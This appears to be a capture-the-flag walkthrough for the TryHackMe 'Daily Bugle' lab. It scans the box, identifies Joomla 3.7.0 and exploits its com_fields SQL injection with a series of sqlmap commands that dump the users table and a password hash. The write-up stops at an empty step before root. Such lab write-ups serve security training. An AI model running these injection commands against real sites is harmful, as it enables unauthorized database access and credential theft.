# Daily Bugle

- [Tools](#tools)
- [Deploy](#deploy)
- [Obtain user and root](#obtain-user-and-root)
- [Credits](#credits)

Room Link: https://tryhackme.com/room/dailybugle

## Tools 

1. NMap https://nmap.org/download
2. JoomScan https://github.com/OWASP/joomscan
3. SearchSploit https://www.exploit-db.com/searchsploit
4. SQLMap https://github.com/sqlmapproject/sqlmap

## Deploy 

1. Start the machine and open the ip in browser.
2. Opening the site shows favicon of joomla on main page and a image with a man masked as spider man, looks like an robber.
3. Question `Access the web server, who robbed the bank?` Answer `spiderman`

## Obtain user and root

1. Running nmap gives some ports.
```bash
nmap -A 10.10.250.153
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-05 11:33 IST
Nmap scan report for 10.10.250.153
Host is up (0.18s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.97 seconds
```
2. Question `What is the Joomla version?` Answer `3.7.0`
Got this details using OWASP joomscan by Mohammad Reza Espargham , Ali Razmjoo.
Command used: `joomscan  -u http://10.10.250.153/`
4. Using SearchSploit by exploitDB gives us SQL injection exploits on this joomla CMS version.
```bash
searchsploit joomla 3.7.0
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection    | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cros | php/webapps/43488.txt
---------------------------------------------- ---------------------------------
Shellcodes: No Results

```
5. After some reasearch on the exploit https://www.exploit-db.com/exploits/42033 and using some commands in SQLMap,
At first we crafted a command to begin SQL injection `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E`
6. Then crafted a SQLMap command to get db names `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E --dbs` and got a database named `joomla`
7. Then crafted a command to table names on DB `joomla` command `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E -D joomla --tables` and we will get a table named `#__users`
8. To extract the table column names, we can use this command, `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E -D joomla -T "#__users" --columns` it will prompt for bruteforcing existing column names, we can find some column names like `id`, `username`, `email`, `password` etc.
9. Then, crafted a command to get password hash of users. `sqlmap -u "http://10.10.250.153/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] --threads=10 --dbms=MySQL --technique=E -D joomla -T "#__users" -C id,name,username,email,password --dump`
It shows result like that,
```bash
+-----+------------+----------+---------------------+--------------------------------------------------------------+
| id  | name       | username | email               | password                                                     |
+-----+------------+----------+---------------------+--------------------------------------------------------------+
| 811 | Super User | jonah    | jonah@tryhackme.com | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |
+-----+------------+----------+---------------------+--------------------------------------------------------------+
```
10.

## Credits

1. We already completed the machine, just click on completed.

Author: Zishan Ahamed Thandar